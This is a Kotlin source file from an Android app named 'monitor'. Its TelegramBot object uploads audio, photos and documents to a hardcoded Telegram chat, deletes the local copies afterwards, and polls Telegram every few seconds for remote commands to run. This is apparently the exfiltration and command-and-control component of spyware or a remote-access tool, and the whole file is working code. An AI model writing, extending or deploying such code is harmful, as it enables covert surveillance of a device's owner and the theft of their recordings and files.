package com.dec.monitor

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File

object TelegramBot {

    private val client = OkHttpClient()
    private val base = "https://api.telegram.org/bot${Config.BOT_TOKEN}"
    private var lastUpdateId = 0L
    var appContext: Context? = null

    suspend fun sendMessage(text: String) = withContext(Dispatchers.IO) {
        try {
            val body = JSONObject().apply {
                put("chat_id", Config.CHAT_ID)
                put("text", text)
                put("parse_mode", "HTML")
            }.toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url("$base/sendMessage").post(body).build()
            client.newCall(req).execute().close()
        } catch (e: Exception) {
            Log.e("TelegramBot", "sendMessage: ${e.message}")
        }
    }

    suspend fun sendAudio(file: File, caption: String) = withContext(Dispatchers.IO) {
        try {
            val reqBody = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.CHAT_ID)
                .addFormDataPart("caption", caption)
                .addFormDataPart("audio", file.name, file.asRequestBody("audio/mpeg".toMediaType()))
                .build()
            val req = Request.Builder().url("$base/sendAudio").post(reqBody).build()
            client.newCall(req).execute().close()
            file.delete()
        } catch (e: Exception) {
            Log.e("TelegramBot", "sendAudio: ${e.message}")
        }
    }

    suspend fun sendPhoto(file: File, caption: String) = withContext(Dispatchers.IO) {
        try {
            val reqBody = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.CHAT_ID)
                .addFormDataPart("caption", caption)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaType()))
                .build()
            val req = Request.Builder().url("$base/sendPhoto").post(reqBody).build()
            client.newCall(req).execute().close()
            file.delete()
        } catch (e: Exception) {
            Log.e("TelegramBot", "sendPhoto: ${e.message}")
        }
    }

    suspend fun sendDocument(file: File, caption: String) = withContext(Dispatchers.IO) {
        try {
            val reqBody = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.CHAT_ID)
                .addFormDataPart("caption", caption)
                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                .build()
            val req = Request.Builder().url("$base/sendDocument").post(reqBody).build()
            client.newCall(req).execute().close()
            file.delete()
        } catch (e: Exception) {
            Log.e("TelegramBot", "sendDocument: ${e.message}")
        }
    }

    fun startPolling(context: Context) {
        appContext = context
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                try {
                    pollCommands(context)
                } catch (e: Exception) {
                    Log.e("TelegramBot", "polling: ${e.message}")
                }
                delay(3000)
            }
        }
    }

    private suspend fun pollCommands(context: Context) = withContext(Dispatchers.IO) {
        val url = "$base/getUpdates?offset=${lastUpdateId + 1}&timeout=2"
        val req = Request.Builder().url(url).build()
        val response = client.newCall(req).execute()
        val body = response.body?.string() ?: return@withContext
        val json = JSONObject(body)
        if (!json.getBoolean("ok")) return@withContext

        val updates = json.getJSONArray("result")
        for (i in 0 until updates.length()) {
            val update = updates.getJSONObject(i)
            lastUpdateId = update.getLong("update_id")
            val message = update.optJSONObject("message") ?: continue
            val text = message.optString("text") ?: continue
            val chatId = message.getJSONObject("chat").getLong("id").toString()
            if (chatId != Config.CHAT_ID) continue
            CommandHandler.handle(context, text)
        }
    }
}
